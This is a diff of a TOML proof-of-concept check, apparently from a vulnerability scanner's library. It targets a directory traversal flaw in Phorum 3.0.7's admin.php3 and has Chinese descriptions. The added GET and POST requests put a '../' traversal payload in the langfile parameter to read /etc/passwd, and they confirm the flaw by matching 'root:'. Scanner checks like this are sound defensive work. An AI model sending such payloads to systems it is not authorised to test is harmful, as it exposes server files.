@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "Phorum 3.0.7 管理后台 Master Settings 功能中 .langfile 参数存在目录遍历漏洞，远程管理员可通过插入 ../ 序列读取服务器任意文件。发送包含目录遍历 payload 的请求至 admin.php3，若响应中包含目标文件内容则验证漏洞存在。"
+description = "检测 Phorum 3.0.7 Master Settings 页面 langfile 参数目录遍历漏洞，通过注入 ../ 序列尝试读取 /etc/passwd 确认是否存在路径遍历"
 id = "POC-AVE-2000-1158"
-name = "Phorum 3.0.7 目录遍历 PoC"
+name = "Phorum 3.0.7 目录遍历任意文件读取 PoC"
 severity = "medium"
 tags = ["ave-2000-1158"]
 vuln_id = [
@@ -15,22 +15,29 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/admin.php3"
+path = "/{{BaseURL}}/admin.php3?langfile=../../../../../../../../etc/passwd"
 protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = [
-    "root:",
-    "bin:",
-    "daemon:",
-]
+words = ["root:"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/admin.php3"
+protocol = "http"
+
+[poc.requests.body]
+content = "langfile=../../../../../../../../etc/passwd"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
